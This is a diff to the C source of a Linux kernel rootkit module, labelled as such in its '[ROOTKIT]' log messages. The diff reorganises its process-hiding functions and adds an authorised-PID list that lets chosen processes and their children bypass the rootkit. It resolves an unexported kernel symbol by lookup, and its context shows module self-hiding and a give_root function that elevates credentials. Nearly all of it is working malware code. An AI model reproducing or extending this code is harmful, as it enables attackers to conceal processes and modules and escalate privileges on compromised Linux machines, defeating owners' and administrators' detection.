@@ -9,14 +9,20 @@
 #include <linux/kobject.h>
 #include <linux/list.h>
 #include <linux/module.h>
+#include <linux/pid.h>
 #include <linux/printk.h>
 #include <linux/rbtree.h>
+#include <linux/rcupdate.h>
+#include <linux/sched.h>
 #include <linux/slab.h>
 #include <linux/sysfs.h>
 #include <linux/types.h>
 #include <linux/vmalloc.h>
 
 LIST_HEAD(hidden_pids_list);
+LIST_HEAD(authorized_pids_list);
+
+static task_t *(*_find_get_task_by_vpid)(pid_t nr) = NULL; // Pointer to `find_get_task_by_vpid()`
 
 void hide_module(void)
 {
@@ -64,46 +70,6 @@ void hide_module(void)
     pr_info("[ROOTKIT] Module was hidden\n");
 }
 
-void show_all_processes(void)
-{
-    hidden_pid_t *p_hidden_pid = NULL; // Hidden PID structure
-    hidden_pid_t *p_tmp        = NULL; // Temporary pointer for iteration
-
-    pr_info("[ROOTKIT] Unhiding all processes...\n");
-
-    // Remove all PIDs from the hidden list
-    list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
-        pr_info("[ROOTKIT] * Unhiding PID %d\n", p_hidden_pid->i32_pid);
-        list_del(&p_hidden_pid->list);
-        kfree(p_hidden_pid);
-    }
-}
-
-bool is_pid_hidden(const pid_t i32_pid)
-{
-    const hidden_pid_t *p_hidden_pid = NULL;                       // Hidden PID structure
-    const pid_t i32_real_pid         = get_effective_pid(i32_pid); // Effective PID to check
-
-    if (i32_real_pid == -1) {
-        return false;
-    }
-
-    // Check if the given PID is in the hidden list
-    list_for_each_entry (p_hidden_pid, &hidden_pids_list, list) {
-        pr_info("[ROOTKIT]   * Checking hidden PID %d against given PID %d...",
-                p_hidden_pid->i32_pid, i32_real_pid);
-        if (p_hidden_pid->i32_pid == i32_real_pid) {
-            pr_cont(" found!\n");
-            return true;
-        }
-        else {
-            pr_cont(" not found\n");
-        }
-    }
-
-    return false;
-}
-
 long give_root(const pid_t i32_pid, const int i32_sig)
 {
     struct cred *p_creds = NULL; // Pointer to the current task credentials
@@ -126,11 +92,36 @@ long give_root(const pid_t i32_pid, const int i32_sig)
     return 0;
 }
 
+bool is_pid_hidden(const pid_t i32_pid)
+{
+    const pid_list_t *p_hidden_pid = NULL;                       // Hidden PID list entry
+    const pid_t i32_real_pid       = get_effective_pid(i32_pid); // Effective PID to check
+
+    if (i32_real_pid == -1) {
+        return false;
+    }
+
+    // Check if the given PID is in the hidden list
+    list_for_each_entry (p_hidden_pid, &hidden_pids_list, list) {
+        pr_info("[ROOTKIT]   * Checking hidden PID %d against given PID %d...",
+                p_hidden_pid->i32_pid, i32_real_pid);
+        if (p_hidden_pid->i32_pid == i32_real_pid) {
+            pr_cont(" found!\n");
+            return true;
+        }
+        else {
+            pr_cont(" not found\n");
+        }
+    }
+
+    return false;
+}
+
 long show_hide_process(const pid_t i32_pid, const int i32_sig)
 {
-    hidden_pid_t *p_hidden_pid = NULL;                       // Hidden PID structure
-    hidden_pid_t *p_tmp        = NULL;                       // Temporary pointer for iteration
-    const pid_t i32_real_pid   = get_effective_pid(i32_pid); // Effective PID to show
+    pid_list_t *p_hidden_pid = NULL;                       // Hidden PID list entry
+    pid_list_t *p_tmp        = NULL;                       // Temporary pointer for iteration
+    const pid_t i32_real_pid = get_effective_pid(i32_pid); // Effective PID to show
 
     IF_U (i32_real_pid == -1) {
         return -EPERM;
@@ -140,9 +131,9 @@ long show_hide_process(const pid_t i32_pid, const int i32_sig)
     case SIGHIDE:
         pr_info("[ROOTKIT] * Hiding process %d\n", i32_real_pid);
 
-        p_hidden_pid = kzalloc(sizeof(hidden_pid_t), GFP_KERNEL);
+        p_hidden_pid = kzalloc(sizeof(pid_list_t), GFP_KERNEL);
         IF_U (p_hidden_pid == NULL) {
-            pr_err("[ROOTKIT]   * Failed to allocate memory for hidden PID structure\n");
+            pr_err("[ROOTKIT]   * Failed to allocate memory for PID list entry\n");
             return -EPERM;
         }
 
@@ -170,4 +161,135 @@ long show_hide_process(const pid_t i32_pid, const int i32_sig)
     }
 
     return 0;
+}
+
+void show_all_processes(void)
+{
+    pid_list_t *p_hidden_pid = NULL; // Hidden PID list entry
+    pid_list_t *p_tmp        = NULL; // Temporary pointer for iteration
+
+    pr_info("[ROOTKIT] Unhiding all processes...\n");
+
+    // Remove all PIDs from the hidden list
+    list_for_each_entry_safe (p_hidden_pid, p_tmp, &hidden_pids_list, list) {
+        pr_info("[ROOTKIT] * Unhiding PID %d\n", p_hidden_pid->i32_pid);
+        list_del(&p_hidden_pid->list);
+        kfree(p_hidden_pid);
+    }
+}
+
+bool is_process_authorized(const pid_t i32_pid)
+{
+    bool b_ret                         = false;                      // Return value
+    const pid_list_t *p_authorized_pid = NULL;                       // Authorized PID list entry
+    const pid_t i32_real_pid           = get_effective_pid(i32_pid); // Effective PID to check
+    task_t *p_task                     = NULL;                       // Task structure
+    task_t *p_task_tmp                 = NULL;                       // Temp pointer for iteration
+    task_t *p_task_tmp2                = NULL;                       // Temp pointer for iteration
+
+    if (i32_real_pid == -1) {
+        return false;
+    }
+
+    IF_U (_find_get_task_by_vpid == NULL) {
+        _find_get_task_by_vpid = (task_t * (*)(pid_t)) lookup_name("find_get_task_by_vpid");
+
+        pr_info("[ROOTKIT] * `find_get_task_by_vpid()` address: %p\n", _find_get_task_by_vpid);
+
+        IF_U (_find_get_task_by_vpid == NULL) {
+            pr_err("[ROOTKIT] * Failed to get `find_get_task_by_vpid()` address\n");
+            return false;
+        }
+    }
+
+    if (i32_pid == 0 || i32_real_pid == current->pid) {
+        p_task = get_task_struct(current);
+    }
+    else {
+        p_task = _find_get_task_by_vpid(i32_real_pid);
+    }
+
+    pr_info("[ROOTKIT] * Checking if PID %d is authorized (task PID: %d)...\n", i32_real_pid,
+            p_task->pid);
+
+    // Check if the given PID is in the authorized list
+    list_for_each_entry (p_authorized_pid, &authorized_pids_list, list) {
+        pr_info("[ROOTKIT]   * Checking authorized PID %d against given PID %d...",
+                p_authorized_pid->i32_pid, i32_real_pid);
+
+        if (p_authorized_pid->i32_pid == i32_real_pid) {
+            pr_info("[ROOTKIT]   * PID %d can bypass rootkit\n", i32_real_pid);
+            b_ret = true;
+            goto loop_end;
+        }
+        else {
+            p_task_tmp = p_task;
+
+            while (p_task_tmp != NULL && p_task_tmp->pid != 0) {
+                p_task_tmp = get_task_struct(p_task_tmp);
+
+                pr_info("[ROOTKIT]   * Checking parent PID %d against given PID %d...",
+                        p_task_tmp->pid, p_authorized_pid->i32_pid);
+
+                if (p_authorized_pid->i32_pid == p_task_tmp->pid) {
+                    pr_info("[ROOTKIT]   * PID %d can bypass rootkit (thanks to parent %d)\n",
+                            i32_real_pid, p_task_tmp->pid);
+                    put_task_struct(p_task_tmp);
+                    b_ret = true;
+                    goto loop_end;
+                }
+                rcu_read_lock();
+                p_task_tmp2 = rcu_dereference(p_task_tmp->real_parent);
+                rcu_read_unlock();
+                put_task_struct(p_task_tmp);
+                p_task_tmp = p_task_tmp2;
+
+                pr_info("[ROOTKIT]   * Parent task: %p\n", p_task_tmp);
+            }
+        }
+    }
+
+loop_end:
+    put_task_struct(p_task);
+    return b_ret;
+}
+
+long authorize_process(const pid_t i32_pid, const int i32_sig)
+{
+    pid_list_t *p_authorized_pid = NULL;                       // Authorized PID list entry
+    const pid_t i32_real_pid     = get_effective_pid(i32_pid); // Effective PID to authorize
+
+    IF_U (i32_real_pid == -1) {
+        return -EPERM;
+    }
+
+    pr_info("[ROOTKIT] * Authorizing process %d\n", i32_real_pid);
+
+    p_authorized_pid = kzalloc(sizeof(pid_list_t), GFP_KERNEL);
+    IF_U (p_authorized_pid == NULL) {
+        pr_err("[ROOTKIT]   * Failed to allocate memory for PID list entry\n");
+        return -EPERM;
+    }
+
+    // Add the given PID to the list (if it is 0, add the current PID)
+    p_authorized_pid->i32_pid = i32_real_pid;
+
+    list_add(&p_authorized_pid->list, &authorized_pids_list);
+
+    return 0;
+}
+
+void clear_auth_list(void)
+{
+    pid_list_t *p_authorized_pid = NULL; // Authorized PID list entry
+    pid_list_t *p_tmp            = NULL; // Temporary pointer for iteration
+
+    pr_info("[ROOTKIT] Clearing authorized process list...\n");
+
+    // Remove all PIDs from the authorized list
+    list_for_each_entry_safe (p_authorized_pid, p_tmp, &authorized_pids_list, list) {
+        pr_info("[ROOTKIT] * Removing PID %d from authorized list\n", p_authorized_pid->i32_pid);
+        list_del(&p_authorized_pid->list);
+        kfree(p_authorized_pid);
+    }
 }
